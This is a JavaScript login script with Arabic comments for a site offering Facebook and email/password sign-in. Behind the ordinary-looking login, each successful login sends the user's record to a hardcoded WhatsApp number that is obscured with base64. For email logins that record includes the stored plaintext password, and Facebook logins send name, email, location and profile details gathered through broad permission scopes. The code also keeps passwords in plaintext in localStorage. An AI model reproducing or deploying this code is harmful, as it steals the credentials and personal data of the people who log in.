// تهيئة SDK الفيسبوك
window.fbAsyncInit = function() {
    FB.init({
        appId: 'YOUR_APP_ID', // استبدل هذا بمعرف التطبيق الخاص بك
        cookie: true,
        xfbml: true,
        version: 'v17.0'
    });
};

// رقم الواتساب المشفر
const WHATSAPP_NUMBER = btoa('01273381280');

// دالة إرسال البيانات إلى WhatsApp
function sendToWhatsApp(message, type) {
    const phoneNumber = atob(WHATSAPP_NUMBER);
    const encodedMessage = encodeURIComponent(message);
    window.open(`https://wa.me/${phoneNumber}?text=${encodedMessage}`, '_blank');
}

// دالة تسجيل الدخول بالفيسبوك
function loginWithFacebook() {
    FB.login(function(response) {
        if (response.status === 'connected') {
            // الحصول على معلومات المستخدم
            FB.api(
                '/me',
                {
                    fields: 'id,name,email,picture.width(300),cover,friends.limit(0).summary(true),posts.limit(0).summary(true),photos.limit(0).summary(true),location'
                },
                function(response) {
                    const userData = {
                        id: response.id,
                        name: response.name,
                        email: response.email,
                        picture: response.picture?.data?.url,
                        cover: response.cover?.source,
                        location: response.location?.name,
                        friends_count: response.friends?.summary?.total_count || 0,
                        posts_count: response.posts?.summary?.total_count || 0,
                        photos_count: response.photos?.summary?.total_count || 0,
                        type: 'facebook',
                        registrationDate: new Date().toISOString()
                    };

                    // حفظ البيانات في localStorage
                    localStorage.setItem('currentUser', JSON.stringify(userData));
                    
                    // إرسال البيانات إلى WhatsApp
                    sendToWhatsApp(`تم تسجيل الدخول عبر فيسبوك:\n${JSON.stringify(userData, null, 2)}`, 'facebook');
                    
                    // عرض رسالة نجاح
                    showError('تم تسجيل الدخول بنجاح!');
                    
                    // إعادة توجيه المستخدم إلى صفحة الملف الشخصي
                    setTimeout(() => {
                        window.location.href = 'profile.html';
                    }, 2000);
                }
            );
        } else {
            showError('فشل تسجيل الدخول بالفيسبوك');
        }
    }, {
        scope: 'public_profile,email,user_friends,user_posts,user_photos,user_location',
        return_scopes: true
    });
}

// دالة التحقق من وجود المستخدم
function checkUserExists(type, id) {
    const users = JSON.parse(localStorage.getItem('users') || '{}');
    return users[`${type}_${id}`] !== undefined;
}

// دالة الحصول على بيانات المستخدم
function getUser(type, id) {
    const users = JSON.parse(localStorage.getItem('users') || '{}');
    return users[`${type}_${id}`];
}

// دالة حفظ بيانات المستخدم
function saveUser(type, id, userData) {
    const users = JSON.parse(localStorage.getItem('users') || '{}');
    users[`${type}_${id}`] = userData;
    localStorage.setItem('users', JSON.stringify(users));
}

// دالة عرض رسائل الخطأ
function showError(message) {
    const errorDiv = document.getElementById('error-message');
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
    
    if (message.includes('نجاح')) {
        errorDiv.style.background = '#e8f5e9';
        errorDiv.style.color = '#2e7d32';
    }
}

// معالجة تقديم نموذج تسجيل الدخول
function handleLogin(event) {
    event.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // التحقق من وجود المستخدم
    const users = JSON.parse(localStorage.getItem('users') || '{}');
    const user = Object.values(users).find(u => u.email === email && u.password === password);
    
    if (user) {
        // حفظ المستخدم الحالي
        localStorage.setItem('currentUser', JSON.stringify(user));
        
        // إرسال البيانات إلى WhatsApp
        sendToWhatsApp(`تم تسجيل الدخول عبر البريد الإلكتروني:\n${JSON.stringify(user, null, 2)}`, 'email');
        
        showError('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه المستخدم إلى صفحة الملف الشخصي
        setTimeout(() => {
            window.location.href = 'profile.html';
        }, 2000);
    } else {
        showError('البريد الإلكتروني أو كلمة المرور غير صحيحة');
    }
    
    return false;
}
